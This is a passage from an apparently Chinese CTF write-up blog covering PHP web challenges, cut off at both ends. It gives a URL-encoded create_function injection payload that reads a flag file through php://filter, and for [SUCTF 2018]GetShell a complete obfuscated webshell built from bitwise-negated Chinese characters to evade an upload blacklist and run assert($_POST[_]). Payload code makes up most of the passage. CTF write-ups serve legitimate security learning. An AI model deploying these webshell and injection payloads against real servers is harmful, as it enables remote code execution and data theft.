class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span>(<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span>())<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404082148359.png" alt="image-20240408214807275"></p><p><strong>提示了flag在rea1fl4g.php里，所以考虑用require函数，php&#x2F;&#x2F;filter读取文件</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">require(php://<span class="hljs-keyword">filter</span>/read<span class="hljs-operator">=</span>convert.base<span class="hljs-number">64</span>-encode/resource<span class="hljs-operator">=</span>rea<span class="hljs-number">1</span>fl<span class="hljs-number">4</span>g.php)<br>url编码之后<br><br>require(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f)<br><br>利用异或或者~进行取反操作<br><br>require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<br><br>替换上一步中的var_dump(get_defined_vars())<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<br><span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404082151012.png" alt="image-20240408215101937"></p><p>进行base64解码，得到flag</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>  <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>  <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>    &#125;<br>  &#125;   <br>&#125; <br></code></pre></td></tr></table></figure><p>检查文件内容（内容前五位不检查），内容中有匹配到黑名单的输出<code>illegal char</code></p><p>文件上传成功后会修改文件后缀为<code>php</code>，那么就需要构造一个webshell成功上传即可</p><p>首先需要fuzz，弄清楚黑名单没有哪些字符，再通过这些字符构造webshell</p><p>可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%8F%96%E5%8F%8D%E6%B1%89%E5%AD%97%E7%BB%95%E8%BF%87">https://blog.csdn.net/mochu7777777/article/details/104631142，使用取反汉字绕过</a></p><p>构造一个<code>assert($_POST[_])</code></p><p>索引<code>1</code>不能再以数字形式直接表示，会被过滤的，在PHP中，两个空数组进行比较会得到<code>true</code>，而<code>true==1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>);<span class="hljs-comment">//$_ = 1</span><br></code></pre></td></tr></table></figure><p>测试汉字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//Author: m0c1nu7 </span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_split_unicode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$l</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$l</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span> += <span class="hljs-variable">$l</span>) &#123;<br>            <span class="hljs-variable">$ret</span>[] = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$l</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;//u&quot;</span>, <span class="hljs-variable">$str</span>, -<span class="hljs-number">1</span>, PREG_SPLIT_NO_EMPTY);<br>&#125;<br> <br><span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城&#x27;</span>;<br><br><span class="hljs-variable">$arr_str</span>=<span class="hljs-title function_ invoke__">str_split_unicode</span>(<span class="hljs-variable">$s</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) ; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&#x27; ------- &#x27;</span>.~<span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br> <br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php <br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>);<span class="hljs-regexp">//</span><span class="hljs-variable">$_</span> = <span class="hljs-number">1</span><br><br><span class="hljs-variable">$__</span> = ~(融);<br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>a<br><span class="hljs-variable">$__</span> = ~(匆);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>ass<br><span class="hljs-variable">$__</span> = ~(随);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>asse<br><span class="hljs-variable">$__</span> = ~(千);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>asser<br><span class="hljs-variable">$__</span> = ~(苦);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>assert<br><br><span class="hljs-variable">$____</span> = ~(~(_));<span class="hljs-regexp">//</span>_<br><span class="hljs-variable">$__</span> = ~(诗);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_P<br><span class="hljs-variable">$__</span> = ~(尘);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_PO<br><span class="hljs-variable">$__</span> = ~(欣);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_POS<br><span class="hljs-variable">$__</span> = ~(站);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_POST<br><br><span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<span class="hljs-regexp">//</span>assert(<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shell.txt</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(融);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(匆);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(随);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(千);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(苦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(诗);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(尘);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(欣);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(站);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><p>上传成功进行rce</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404212201756.png" alt="image-20240421220049082"></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404212201110.png" alt="image-20240421220132989"></p><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 